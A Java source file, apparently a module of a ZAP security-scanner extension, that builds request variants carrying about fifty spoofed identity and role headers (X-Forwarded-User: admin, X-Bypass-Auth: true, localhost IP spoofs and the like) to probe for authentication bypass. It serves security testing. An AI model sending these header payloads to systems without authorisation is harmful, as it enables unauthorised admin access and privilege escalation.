package org.zaproxy.zap.extension.hacktor.technique;

import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.extension.hacktor.Technique;
import java.util.List;
import java.util.function.BiConsumer;

public class AuthForwardingTechniqueBuilder extends AbstractTechniqueBuilder {
    @Override public String getFamily() { return "Auth Forwarding"; }
    @Override public int getOrder() { return 43; }

    @Override
    public void build(List<Technique> techs, BiConsumer<HttpMessage, String> setPath,
                      TechniqueBuilder.PathContext ctx) {
        String[][] authHeaders = {
            {"X-Real-User","admin"},{"X-Real-User","root"},
            {"X-Forwarded-User","admin"},{"X-Forwarded-User","root"},
            {"X-Authenticated-User","admin"},{"X-Authenticated-Role","admin"},
            {"X-Authenticated-Roles","admin"},{"X-Remote-User","admin"},
            {"X-Remote-User","root"},{"X-User","admin"},
            {"X-User-Name","admin"},{"X-Username","admin"},
            {"X-Logged-In-User","admin"},{"X-Forwarded-Role","admin"},
            {"X-Forwarded-Admin","true"},{"X-Forwarded-Admin","1"},
            {"X-Forwarded-Authorization","Bearer admin"},{"X-Auth","admin"},
            {"X-Auth-Role","admin"},{"X-Auth-User","admin"},
            {"X-Auth-Token","admin"},{"X-Admin-User","admin"},
            {"X-Admin-Role","admin"},{"X-Privileged","true"},
            {"X-Authenticated-Scopes","admin"},{"X-Forwarded-Principal","admin"},
            {"X-Security-Context","admin"},{"X-CSRF-Token","admin"},
            {"X-Session-ID","admin"},{"X-Access-Token","admin"},
            {"X-API-Key","admin"},{"X-Api-Key","admin"},
            {"X-Internal","true"},{"X-Debug","true"},
            {"X-Test","true"},{"X-Staging","true"},
            {"X-Bypass-Auth","true"},{"X-Skip-Auth","true"},
            {"X-Forwarded-For-Original","127.0.0.1"},
            {"X-Real-IP-Original","127.0.0.1"},
            {"X-Original-Remote-Addr","127.0.0.1"},
            {"X-Client-Original-IP","127.0.0.1"},
            {"X-Forwarded-By","127.0.0.1"},
            {"X-True-IP","127.0.0.1"},
            {"X-ProxyUser","admin"},{"X-Proxy-User","admin"},
            {"X-Goog-Authenticated-User-Email","admin@example.com"},
            {"X-Goog-Authenticated-User-Id","admin"},
            {"X-Azure-ClientID","admin"},{"X-Azure-Object-ID","admin"},
            {"X-Auth-Groups","admin"},{"X-User-Groups","admin"},
            {"X-Effective-Role","admin"},{"X-Assumed-Role","admin"}
        };
        for (String[] pair : authHeaders) {
            final String hn = pair[0], hv = pair[1];
            techs.add(new Technique("Auth Forwarding", "AuthHdr:" + pair[0] + "=" + pair[1],
                "Auth forwarding header: " + pair[0] + ": " + pair[1],
                base -> { HttpMessage c = cloneMsg(base); addHeader(c, hn, hv); return c; }));
        }
    }
}
